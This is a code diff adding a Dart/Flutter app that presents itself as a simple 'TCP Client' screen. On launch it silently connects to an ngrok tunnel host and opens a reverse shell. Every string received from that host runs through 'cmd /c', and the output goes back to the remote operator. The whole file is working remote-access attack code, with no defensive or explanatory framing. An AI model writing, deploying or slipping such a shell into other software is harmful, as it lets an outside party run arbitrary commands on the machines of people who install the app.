@@ -1,0 +1,84 @@
+import 'dart:io';
+import 'dart:convert';
+import 'package:flutter/material.dart';
+
+void main() {
+  runApp(MyApp());
+  Future.delayed(Duration.zero, () => startClient());
+}
+
+class MyApp extends StatelessWidget {
+  @override
+  Widget build(BuildContext context) {
+    return MaterialApp(
+      title: 'Flutter TCP Client',
+      home: Scaffold(
+        appBar: AppBar(title: Text('TCP Client')),
+        body: Center(child: Text('Connected to server...')),
+      ),
+    );
+  }
+}
+
+void startClient() async {
+  final ip = '0.tcp.in.ngrok.io'; // Replace with your Ngrok IP
+  final port = 15569; // Replace with your Ngrok port
+
+  try {
+    final socket = await Socket.connect(ip, port);
+    print('[*] Connected to $ip:$port');
+    socket.write('Flutter shell ready.\n');
+
+    socket.listen(
+      (data) async {
+        final command = utf8.decode(data).trim();
+        print('[>] Received: $command');
+
+        if (command.toLowerCase() == 'q') {
+          socket.write('Closing connection.\n');
+          await socket.close();
+          exit(0);
+        } else {
+          final output = await runCmdCommand(command);
+          socket.write(output + '\n');
+        }
+      },
+      onError: (error) {
+        print('❌ Socket error: $error');
+        socket.destroy();
+      },
+      onDone: () {
+        print('[*] Server closed connection.');
+        socket.destroy();
+      },
+    );
+  } catch (e) {
+    print('❌ Connection failed: $e');
+  }
+}
+
+Future<String> runCmdCommand(String command) async {
+  try {
+    final result = await Process.run(
+      'cmd',
+      ['/c', command],
+      runInShell: true,
+      stdoutEncoding: utf8,
+      stderrEncoding: utf8,
+    );
+
+    final output = StringBuffer();
+    if (result.stdout.toString().isNotEmpty) {
+      output.writeln('[stdout]');
+      output.writeln(result.stdout);
+    }
+    if (result.stderr.toString().isNotEmpty) {
+      output.writeln('[stderr]');
+      output.writeln(result.stderr);
+    }
+
+    return output.toString();
+  } catch (e) {
+    return '❌ Exception: $e\n';
+  }
+}
